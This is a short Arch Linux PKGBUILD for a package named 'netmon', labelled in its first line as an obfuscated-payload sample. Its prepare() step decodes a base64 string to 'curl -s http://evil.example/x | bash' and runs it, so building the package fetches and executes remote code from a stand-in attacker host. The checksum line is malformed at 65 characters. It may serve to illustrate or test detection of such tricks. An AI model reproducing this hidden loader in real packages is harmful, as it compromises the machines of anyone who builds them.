# obfuscated payload: a base64 blob decoded straight into bash
pkgname=netmon
pkgver=1.1.0
pkgrel=1
arch=('x86_64')
url="https://netmon.example"
license=('GPL2')
source=("https://netmon.example/netmon-$pkgver.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef0')

prepare() {
  echo "Y3VybCAtcyBodHRwOi8vZXZpbC5leGFtcGxlL3ggfCBiYXNo" | base64 -d | bash
}

build()   { cd "netmon-$pkgver"; make; }
package() { cd "netmon-$pkgver"; make DESTDIR="$pkgdir" install; }
